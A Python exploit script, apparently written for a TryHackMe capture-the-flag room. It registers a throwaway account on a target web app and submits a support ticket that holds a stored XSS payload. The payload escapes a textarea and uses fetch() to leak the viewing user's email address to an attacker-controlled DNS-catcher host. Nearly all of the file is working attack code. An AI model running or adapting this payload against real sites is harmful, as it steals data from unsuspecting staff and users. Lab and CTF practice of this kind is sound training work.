#!/usr/bin/env python3

import argparse
import os
import platform
import random
import re
import requests
import string

class Attacker:
    def __init__(self, baseurl, dnscatcher):
        if not(isinstance(baseurl,str)):
            raise TypeError(f"Baseurl must be a string. Got {type(baseurl)}")
        elif len(baseurl) < 1:
            raise ValueError("Baseurl must be a non-zero length string")
        elif baseurl[-1] == "/":
            baseurl = baseurl[:-1]

        if not(isinstance(dnscatcher,str)):
            raise TypeError(f"Dnscatacher must be a string. Got {type(dnscatcher)}")
        elif len(dnscatcher) < 1:
            raise ValueError("Dnscatcher must be a non-zero length string")

        self.__baseurl = baseurl
        self.__credentials = dict()
        self.__dnscatcher = dnscatcher
        self.__session = requests.Session()
        self.__timeout = 5
        return

    def CreateTicket(self):
        attack = str()
        escape = "</textarea>"
        data = dict()
        message = str()
        randstr = str()
        success = bool()

        try:
            randstr, success, message = GenRandomString(3,5)
            if not(success):
                raise ValueError(f"{ANSI_RED}[randstr]{ANSI_RST} {message}")

            attack=f"""</textarea><script>fetch("http://"+((document.getElementById("email").innerHTML).replace("@","-at-")).replace(".","-")+".{randstr}.{self.__dnscatcher}");</script><textarea>"""
            data["message"] = f"""{escape}{attack}"""

            resp = self.__session.post(self.__baseurl, data=data, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"{ANSI_RED}[ticket]{ANSI_RST} bad status code ({ANSI_RED}{resp.status_code} {resp.reason}{ANSI_RST})")

            message = "malicious ticket created"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def Login(self):
        data = dict()
        message = str()
        success = bool()
        targetroute = "login"
        targeturl = f"{self.__baseurl}/{targetroute}"

        try:
            data["email"] = self.__credentials.get("email")
            if data["email"] is None:
                raise ValueError("no credentials. please register a user first")

            data["password"] = self.__credentials.get("password")
            if data["password"] is None:
                raise ValueError("no credentials. please register a user first")

            resp = self.__session.post(targeturl, data=data, timeout=self.__timeout)
            if "we not not recognise that email" in resp.text.lower():
                raise ValueError(f"{ANSI_RED}[login]{ANSI_RST} incorrect username \"{data['email']}\"")
            elif "invalid email / password combination" in resp.text.lower():
                raise ValueError(f"{ANSI_RED}[login]{ANSI_RST} incorrect password for \"{data['email']}\"")
            elif resp.status_code >= 400:
                raise ValueError(f"{ANSI_RED}[login]{ANSI_RST} bad status code ({ANSI_RED}{resp.status_code} {resp.reason}{ANSI_RST})")

            message = "login successful"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def Register(self):
        credentials = dict()
        message = str()
        success = bool()
        targetroute = "register"
        targeturl = f"{self.__baseurl}/{targetroute}"

        try:
            email, success, message = GenRandomString(5,8)
            if not(success):
                raise ValueError(message)
            email = f"{email}@test.test"

            password, success, message = GenRandomString(6,10)
            if not(success):
                raise ValueError(message)

            credentials["email"] = email
            credentials["password"] = credentials["confirm_password"] = password

            resp = self.__session.post(targeturl, data=credentials, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"{ANSI_RED}[register]{ANSI_RST} bad status code ({ANSI_RED}{resp.status_code} {resp.reason}{ANSI_RST})")
            elif "email address is already registered" in resp.text.lower():
                raise ValueError(f"{ANSI_RED}[register]{ANSI_RST} user already registered")

            self.__credentials = credentials

            message = f"registration successful ({ANSI_GRN}{credentials['email']}:{credentials['password']}{ANSI_RST})"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def GenRandomString(minlen = None, maxlen = None):
    message = str()
    randstring = str()
    success = bool()

    try:
        alphabet = f"{string.ascii_lowercase}{string.ascii_uppercase}{string.digits}"

        ############################################################
        # Validate minlen value
        ############################################################
        if minlen is None:
            minlen = 8
        elif not(isinstance(minlen,int)):
            raise TypeError("Minlen must be int. Got {type(minlen)}")
        elif minlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Validate maxlen value
        ############################################################
        if maxlen is None:
            maxlen = 15
        elif not(isinstance(maxlen,int)):
            raise TypeError("Minlen must be int. Got {type(maxlen)}")
        elif maxlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Make sure minlen <= maxlen
        ############################################################
        if minlen > maxlen:
            tmp = maxlen
            maxlen = minlen
            minlen = tmp

        ############################################################
        # Choose length of string
        ############################################################
        stringlen = random.randrange(minlen, maxlen)

        ############################################################
        # Build random string
        ############################################################
        for i in range(stringlen):
            curchoice = random.choice(alphabet)
            randstring = f"{randstring}{curchoice}"

        message = "random string generated"
        success = True
    except Exception as ex:
        message = str(ex)
        randstring = ""
        success = False
    return (randstring, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("--dns", help="address of dnscatcher", dest="dns", default="127.0.0.1")
    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure
    dns = args.dns

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseURL = f"{scheme}://{target}:{port}"

    attacker = Attacker(baseURL, dns)

    success, message = attacker.Register()
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    success, message = attacker.CreateTicket()
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    return

if __name__ == "__main__":
    main()

